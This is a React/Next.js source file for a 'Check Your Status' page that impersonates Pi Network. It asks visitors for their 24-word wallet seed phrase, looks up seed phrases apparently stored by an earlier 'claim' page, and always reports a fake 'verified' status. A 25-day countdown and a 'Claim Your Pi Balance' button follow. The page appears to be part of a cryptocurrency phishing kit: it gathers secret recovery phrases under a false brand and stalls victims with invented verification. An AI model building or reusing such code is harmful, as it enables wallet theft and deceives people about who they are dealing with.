
'use client';

import { useState, useEffect, Suspense } from 'react';
import { useSearchParams } from 'next/navigation';
import Link from 'next/link';

function StatusContent() {
  const [seedPhrase, setSeedPhrase] = useState('');
  const [userStatus, setUserStatus] = useState<any>(null);
  const [loading, setLoading] = useState(false);
  const [timeLeft, setTimeLeft] = useState(0);
  const searchParams = useSearchParams();

  useEffect(() => {
    // Check if redirected from claim process
    const fromClaim = searchParams.get('from');
    if (fromClaim === 'claim') {
      // Auto-populate with last submitted data
      const claimData = JSON.parse(localStorage.getItem('claimData') || '[]');
      if (claimData.length > 0) {
        const lastEntry = claimData[claimData.length - 1];
        handleStatusCheck(lastEntry.seedPhrase);
      }
    }
  }, [searchParams]);

  useEffect(() => {
    if (userStatus && userStatus.status === 'verified') {
      const endDate = new Date(userStatus.timestamp);
      endDate.setDate(endDate.getDate() + 25);
      
      const timer = setInterval(() => {
        const now = new Date().getTime();
        const distance = endDate.getTime() - now;
        
        if (distance > 0) {
          const days = Math.floor(distance / (1000 * 60 * 60 * 24));
          const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
          const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
          const seconds = Math.floor((distance % (1000 * 60)) / 1000);
          
          setTimeLeft(days * 24 * 60 * 60 + hours * 60 * 60 + minutes * 60 + seconds);
        } else {
          setTimeLeft(0);
          clearInterval(timer);
        }
      }, 1000);

      return () => clearInterval(timer);
    }
  }, [userStatus]);

  const handleStatusCheck = (phrase?: string) => {
    const checkPhrase = phrase || seedPhrase;
    if (!checkPhrase.trim()) return;

    setLoading(true);
    
    // Simulate API call
    setTimeout(() => {
      const claimData = JSON.parse(localStorage.getItem('claimData') || '[]');
      const userEntry = claimData.find((entry: any) => entry.seedPhrase === checkPhrase.trim());
      
      if (userEntry) {
        // Simulate verification completion
        const updatedEntry = {
          ...userEntry,
          status: 'verified',
          verifiedAt: new Date().toISOString()
        };
        setUserStatus(updatedEntry);
      } else {
        setUserStatus(null);
      }
      
      setLoading(false);
    }, 1500);
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    handleStatusCheck();
  };

  const formatTime = (seconds: number) => {
    const days = Math.floor(seconds / (24 * 60 * 60));
    const hours = Math.floor((seconds % (24 * 60 * 60)) / (60 * 60));
    const minutes = Math.floor((seconds % (60 * 60)) / 60);
    const secs = seconds % 60;
    
    return `${days}d ${hours}h ${minutes}m ${secs}s`;
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-purple-600 via-purple-700 to-purple-900">
      <div className="container mx-auto px-4 py-8">
        {/* Header */}
        <div className="text-center mb-8 relative">
          <div className="relative inline-block">
            <img 
              src="https://static.readdy.ai/image/e8f23d307a34a2c387d25bd44502a87a/e6f6427966b9d5676551ee9ece307b66.png" 
              alt="Pi Network Logo" 
              className="absolute -left-16 top-1/2 transform -translate-y-1/2 w-12 h-12 object-contain"
            />
            <h1 className="text-3xl font-bold text-white mb-2">Pi Network</h1>
          </div>
          <p className="text-white/90">Check Your Status</p>
        </div>

        <div className="max-w-md mx-auto">
          {!userStatus ? (
            <div className="bg-white rounded-2xl shadow-2xl p-8">
              <div className="text-center mb-6">
                <div className="w-16 h-16 bg-gradient-to-br from-purple-500 to-purple-700 rounded-full flex items-center justify-center mx-auto mb-4">
                  <i className="ri-search-line text-white text-2xl"></i>
                </div>
                <h2 className="text-2xl font-bold text-gray-800 mb-2">Check Verification Status</h2>
                <p className="text-gray-600">Enter your seed phrase to check your claim status</p>
              </div>

              <form onSubmit={handleSubmit}>
                <div className="mb-6">
                  <label className="block text-sm font-medium text-gray-700 mb-2">
                    24-Word Seed Phrase
                  </label>
                  <textarea
                    value={seedPhrase}
                    onChange={(e) => setSeedPhrase(e.target.value)}
                    className="w-full px-4 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-purple-500 focus:border-purple-500 outline-none transition-colors resize-none"
                    rows={4}
                    placeholder="Enter your 24-word seed phrase"
                    required
                    maxLength={500}
                  />
                </div>

                <button
                  type="submit"
                  disabled={loading || !seedPhrase.trim()}
                  className="w-full bg-gradient-to-r from-purple-600 to-purple-800 text-white font-semibold py-3 px-6 rounded-xl hover:from-purple-700 hover:to-purple-900 transition-all duration-300 disabled:opacity-50 disabled:cursor-not-allowed whitespace-nowrap cursor-pointer"
                >
                  {loading ? (
                    <div className="flex items-center justify-center space-x-2">
                      <i className="ri-loader-4-line animate-spin"></i>
                      <span>Checking Status...</span>
                    </div>
                  ) : (
                    'Check Status'
                  )}
                </button>
              </form>

              <div className="mt-6 text-center">
                <Link href="/claim">
                  <span className="text-purple-600 hover:text-purple-700 text-sm cursor-pointer">
                    Haven't started verification? Start here →
                  </span>
                </Link>
              </div>
            </div>
          ) : (
            <div className="bg-white rounded-2xl shadow-2xl p-8">
              <div className="text-center mb-6">
                <div className="w-16 h-16 bg-green-500 rounded-full flex items-center justify-center mx-auto mb-4">
                  <i className="ri-check-circle-line text-white text-2xl"></i>
                </div>
                <h2 className="text-2xl font-bold text-green-600 mb-2">Congratulations {userStatus.kycName}!</h2>
              </div>

              <div className="bg-green-50 border border-green-200 rounded-xl p-4 mb-6">
                <p className="text-green-800 text-center">
                  Your details have matched with your Pi Network account and your details have been verified!
                </p>
              </div>

              <div className="bg-gradient-to-r from-purple-600 to-purple-800 rounded-xl p-6 text-white text-center mb-6">
                <h3 className="text-lg font-semibold mb-2">Time Remaining</h3>
                <div className="text-3xl font-bold mb-2">
                  {formatTime(timeLeft)}
                </div>
                <p className="text-sm text-white/90">
                  After this timer expires, you'll be able to move your unverified balance to verified and claim it in your Pi wallet
                </p>
              </div>

              <div className="space-y-3">
                <div className="flex items-center justify-between p-3 bg-gray-50 rounded-xl">
                  <span className="text-gray-600">Status:</span>
                  <span className="font-semibold text-green-600">Verified ✓</span>
                </div>
                
                <div className="flex items-center justify-between p-3 bg-gray-50 rounded-xl">
                  <span className="text-gray-600">Submitted:</span>
                  <span className="font-semibold text-gray-800">
                    {new Date(userStatus.timestamp).toLocaleDateString()}
                  </span>
                </div>

                <div className="flex items-center justify-between p-3 bg-gray-50 rounded-xl">
                  <span className="text-gray-600">Claim Available:</span>
                  <span className="font-semibold text-purple-600">
                    {timeLeft > 0 ? 'Pending' : 'Ready to Claim'}
                  </span>
                </div>
              </div>

              {timeLeft === 0 && (
                <div className="mt-6">
                  <button className="w-full bg-gradient-to-r from-purple-600 to-purple-800 text-white font-semibold py-3 px-6 rounded-xl hover:from-purple-700 hover:to-purple-900 transition-all duration-300 whitespace-nowrap cursor-pointer">
                    Claim Your Pi Balance
                  </button>
                </div>
              )}

              <div className="mt-6 text-center">
                <button 
                  onClick={() => {
                    setUserStatus(null);
                    setSeedPhrase('');
                  }}
                  className="text-gray-500 hover:text-gray-700 text-sm cursor-pointer"
                >
                  ← Check Another Account
                </button>
              </div>
            </div>
          )}
        </div>

        {/* Footer */}
        <div className="text-center mt-8">
          <Link href="/">
            <span className="text-white/70 hover:text-white text-sm cursor-pointer">
              ← Back to Home
            </span>
          </Link>
          <p className="text-white/70 text-sm mt-4">© 2024 SocialChain Inc. | All rights reserved.</p>
        </div>
      </div>
    </div>
  );
}

export default function StatusPage() {
  return (
    <Suspense fallback={
      <div className="min-h-screen bg-gradient-to-br from-purple-600 via-purple-700 to-purple-900 flex items-center justify-center">
        <div className="text-white text-center">
          <i className="ri-loader-4-line animate-spin text-4xl mb-4"></i>
          <p>Loading...</p>
        </div>
      </div>
    }>
      <StatusContent />
    </Suspense>
  );
}
